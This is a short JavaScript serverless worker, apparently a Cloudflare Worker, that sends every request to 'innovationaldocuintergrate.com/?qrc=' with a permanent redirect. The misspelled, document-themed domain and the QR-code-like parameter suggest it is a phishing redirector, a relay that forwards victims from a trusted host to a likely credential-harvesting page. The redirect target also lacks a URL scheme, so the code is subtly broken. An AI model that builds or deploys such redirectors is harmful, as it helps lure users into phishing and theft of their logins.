export default {
  async fetch(request, env, ctx) {
    const redirectUrl = "innovationaldocuintergrate.com/?qrc=";
    return Response.redirect(redirectUrl, 301);
  }
};
